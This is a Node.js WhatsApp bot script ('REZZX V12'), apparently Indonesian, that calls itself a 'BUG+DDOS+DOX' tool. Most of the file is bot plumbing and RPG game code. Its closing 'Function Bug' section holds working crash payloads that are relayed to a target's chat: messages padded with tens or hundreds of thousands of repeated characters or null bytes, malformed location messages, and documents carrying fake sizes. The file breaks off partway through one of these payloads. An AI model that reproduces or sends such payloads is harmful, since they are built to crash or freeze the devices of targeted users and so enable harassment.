/*

                                                                      SCRIPT BY REZZX
                                                                      BASE ORI : REZZX
                                                              SCRIPT INI DIBUAT+DI ADDFITUR PADA TANGGAL : 24-08-2024
                                                              SCRIPT INI BERTIPE : BUG+DDOS+DOX
                                                                           SCRIPT BERVERSI : REZZX V12

COLLABORASI DENGAN:
-RADZZ
-XEONBOTINC
-RXHL
-QIOO
-NEROKPANEL
-ABY PELER

THANKS TO:
Pembuat Script
RezzX
Qioo
Rxhl
XeonBotInc
AbyAgency-VX
Nerokpanel
RezzX-V12
4Khyren
Pembuat Apikey+lolhuman
Baileys

*/

module.exports = async (rezzx, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = ( m.mtype === 'conversation' ? m.message.conversation : m.mtype === 'imageMessage' ? m.message.imageMessage.caption : m.mtype === 'videoMessage' ? m.message.videoMessage.caption : m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text : m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id : m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId : m.mtype === 'messageContextInfo' ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.message.InteractiveResponseMessage.NativeFlowResponseMessage || m.text : '');
const type = m  
const lol = 'elainaai'
const neo = 'DitzOfc'
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2') 
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us') 
const botNumber = await rezzx.decodeJid(rezzx.user.id)
const sender = m.key.fromMe ? (rezzx.user.id.split(':')[0]+'@s.whatsapp.net' || rezzx.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const tag = `@${m.sender.split("@")[0]}`
const groupMetadata = isGroup ? await rezzx.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')

const speed = require('performance-now')
const { performance } = require('perf_hooks')
const ytdl = require("ytdl-core")
const yts = require ('yt-search')

const banned = JSON.parse(fs.readFileSync('./setup/database/banned.json', 'utf8'))
const isBan = banned.includes(m.sender)
const { addSaldo, minSaldo, cekSaldo, transferSaldo } = require("./lib/topup.js");
const { smsg, getTime, isUrl, sleep, runtime, fetchJson, formatp, getBuffer, shorturl, getRandom, getGroupAdmins, clockString } = require('./setup/myfunc')
const pengguna = JSON.parse(fs.readFileSync('./setup/database/user.json'))
const db_user = JSON.parse(fs.readFileSync('./setup/database/user.json'))
const { remini } = require('./lib/remini') 
const { sendRandomYandereImage, sendRandomDanbooruImage, totalFitur, wpp, obfus, Llama3WithSesi, randomNomor, upvidey, random_mail, get_mails } = require('./lib/random')
const { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
const { listCase } = require('./lib/listCase.js')
const { mediafireDl } = require('./lib/mediafire.js')
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
const { dellCase } = require('./lib/dellCase.js')
const { ssweb, jarak } = require('./lib/scraper')
const { igdl, igdl2 } = require('./lib/igdl.js')
const { startGame, releaseWeapon, craftItem, useItem, exitGame, searchPlace, takeItem, getPlayerInventory, movePlayer, fightZombie, loadPlayerData } = require('./games/last-survive');
const { TelegraPH } = require("./lib/TelegraPH")

//Rpg database
let _limit = JSON.parse(fs.readFileSync('./games/rpg/limit.json'));
let _buruan = JSON.parse(fs.readFileSync('./games/rpg/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./games/rpg/darah.json'))
const _petualang = JSON.parse(fs.readFileSync('./games/rpg/inventory.json'))
const { addInventoriDarah, cekDarah, addDarah, kurangDarah, getDarah } = require('./games/rpg/darah.js')
const { cekInventory } = require('./games/rpg/alat_tukar.js')
const { addInventoriMonay, cekMonay, addMonay, kurangMonay, getMonay } = require('./games/rpg/monay.js')
const { addInventoriLimit, cekLimit, addLimit, kurangLimit } = require('./games/rpg/limit.js')
let balance = JSON.parse(fs.readFileSync('./setup/database/balance.json'));
const { cekBuruan, addInventoriBuruan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi,kurangGajah, getIkan, getAyam, getKelinci, getDomba,getSapi,getGajah} = require('./games/rpg/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,addIkan,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addBatu,getMiningstone,getBatuId,addBatuId,jualStone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addInventori, sellBesi, addDm, sellDm, getDm, sellEmas, addFish, sellFish, getFish, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion,getBesi, getEmas, getEmerald,getUmpan,getPotion} = require('./games/rpg/rpg.js')
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
let limit = JSON.parse(fs.readFileSync('./setup/database/limit.json'));
let DarahAwal = 100;
const ikan = ['🐟','🐠','🐡']
const enter = '\n'
const isPetualang = checkPetualangUser(m.sender)
const isCekDarah = await getDarah(m.sender)
const isUmpan = await getUmpan(m.sender)
const isPotion = await getPotion(m.sender)
const isIkan = await getFish(m.sender)
const isAyam = await getAyam(m.sender)
const isKelinci = await getKelinci(m.sender)
const isDomba = await getDomba(m.sender)
const isSapi = await getSapi(m.sender)
const isGajah = await getGajah(m.sender)
const isMonay = await getBalance(m.sender, balance)
const isBesi = await getBesi(m.sender)
const isEmas = await getEmas(m.sender)
const isEmerald = await getEmerald(m.sender)

let player = loadPlayerData();
global.db.data = JSON.parse(fs.readFileSync('./setup/database.json'))
if (global.db.data) global.db.data = {
users: {},
chats: {},
game: {},
database: {},
settings: {},
others: {},
...(global.db.data || {})
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var waktu = 'Selamat Malam 🌉️'
        }
        if (time2 < "19:00:00") {
            var waktu = 'Selamat Sore 🌆'
        }
        if (time2 < "18:00:00") {
            var waktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var waktu = 'Selamat Siang 🌁️'
        }
        if (time2 < "10:00:00") {
            var waktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var waktu = 'Selamat Pagi 🌆'
        }
        if (time2 < "03:00:00") {
            var waktu = 'Selamat Malam 🌃'
        }
        
if (m.message) {
  if (isCmd && !m.isGroup) {
    console.log(chalk.black(chalk.bgHex('#4a69bd').bold(`\n🕛 ${waktu}`)));
    console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`PESAN TERDETEKSI!`)));
    console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📆 DATE: ${new Date().toLocaleString()}
💭 PESAN : ${m.body || m.mtype}
👤️ DARI : ${pushname}
🔖 USER JID : ${m.sender}`)));
  } else if (m.isGroup) {
    console.log(chalk.black(chalk.bgHex('#4a69bd').bold(`\n🕛 ${waktu}`)));
    console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`PESAN TERDETEKSI!`)));
    console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📆 DATE: ${new Date().toLocaleString()}
💭 PESAN : ${m.body || m.mtype}
👤 DARI : ${pushname}
🔖 USER JID : ${m.sender}
💡 LOKASI : ${groupName}`)));
  }
}

//pick rndm
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

// Database
const prem = JSON.parse(fs.readFileSync("./setup/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./setup/database/owner.json"))
const rzvimage = fs.readFileSync('./rzv/rezzv.jpg')
const virgam = fs.readFileSync('./rzv/virgam.png')
const slayer07 = fs.readFileSync('./rzv/slayer07.jpg')
const bugthumb = fs.readFileSync ('./rzv/anu.png')
const db_saldo = JSON.parse(fs.readFileSync("./setup/database/saldo.json"));
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot



//Cek Db User
let cekUser = (satu, dua) => { 
  let x1 = false
  Object.keys(db_user).forEach((i) => {
  if (db_user[i].id == dua){x1 = i}})
  if (x1 !== false) {
    if (satu == "id"){ return db_user[x1].id }
    if (satu == "name"){ return db_user[x1].name }
    if (satu == "seri"){ return db_user[x1].seri }
    if (satu == "premium"){ return db_user[x1].premium }
  }
  if (x1 == false) { return null } 
}

//Bikin Id
const makeid = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() *
      charactersLength));
    }
    return result
}

// Vcard
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await rezzx.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await rezzx.getName(i + '@s.whatsapp.net')}\n
FN:${await rezzx.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:rezzajakali@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL: https://heylink.me/rezzx-website
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

//convert rp
function toRupiah(angka) {
  var saldo = '';
  var angkarev = angka.toString().split('').reverse().join('');
  for (var i = 0; i < angkarev.length; i++)
  if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
  return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

const ball = `${toRupiah(cekSaldo(sender, db_saldo))}`

//ytmp3
const downloadMp3 = async (Link) => {
try {
  await ytdl.getInfo(Link)
  let mp3File = getRandom('.mp3')
  console.log(color('PROCESS DOWNLOADING AUDIO 🔄'))
  ytdl(Link, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3File))
  .on('finish', async () => {
    rezzx.sendMessage(m.chat, {react: { text: '✅', key: m.key,}})
    await rezzx.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
    fs.unlinkSync(mp3File)
  })
} catch (err) {
    m.reply(`${err}`)
  }
}

try {
  ppuser = await rezzx.profilePictureUrl(m.sender, 'image')
} catch (err) {
    ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
  }

const fkethmb = await reSize(ppuser, 300, 300)

const xreply = (teks, url) => {
rezzx.sendMessage(from, { text: teks, contextInfo: {
            mentionedJid: [],
            groupMentions: [],
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363303294206875@newsletter',
               newsletterName: "RezzX-Botz-V12",
                serverMessageId: -1
            },
            forwardingScore: 256,
externalAdReply: {
        showAdAttribution: true,
        title: `RezzX-Botz-V12`,
        body: `1.6 Version`,
        thumbnailUrl: url,
        mediaType: 1,
        renderLargerThumbnail: true
          }
        }}, { quoted: fkontak })}
     
const replyai = (teks, title, body, url) => { 
rezzx.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": false, 
"title": title, 
"body": body,
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnailUrl": url,
"renderLargeThumbnail": true }}},{quoted:m} ) }
        
const wett = () => {
rezzx.sendMessage(from, {react: { text: '🕒', key: m.key,}})
}

const okk = () => {
rezzx.sendMessage(from, {react: { text: '✅', key: m.key,}})
}

// sticker
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

// audio
const shan = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 600,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

// kontak
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/e21bb9c200ae6f8f9214.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $('input[name=token]').val();
      let build_server = $('input[name=build_server]').val();
      let build_server_id = $('input[name=build_server_id]').val();
      form.append('text[]', text);
      form.append('token', token);
      form.append('build_server', build_server);
      form.append('build_server_id', build_server_id);
      let res = await axios({
        url: url,
        method: 'POST',
        data: form,
        headers: {
          Accept: '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
          cookie: gT.headers['set-cookie']?.join('; '),
          ...form.getHeaders(),
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$('input[name=form_value_input]').val());
      json['text[]'] = json.text;
      delete json.text;
      let { data } = await axios.post(
        'https://en.ephoto360.com/effect/create-image',
        new URLSearchParams(json),
        {
          headers: {
            'user-agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
            cookie: gT.headers['set-cookie'].join('; '),
          },
        }
      );
      return build_server + data.image;
    }
    
 // Function Bug

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": rzvimage
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const bugquoteddvc = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: ` REZZX VIRUS `
}
}
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    rezzx.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌.vx`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph//file/bc875303908201d69a8e6.jpg" } }, { upload: rezzx.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #rezzxryoikitenkai"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//

async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "VX NOT VX - REZZX V12🍀" + "\0".repeat(920000),
      'footerText': "NOT VX - REZZX V12🍀",
      'description': "NOT VX - REZZX V12🍀",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
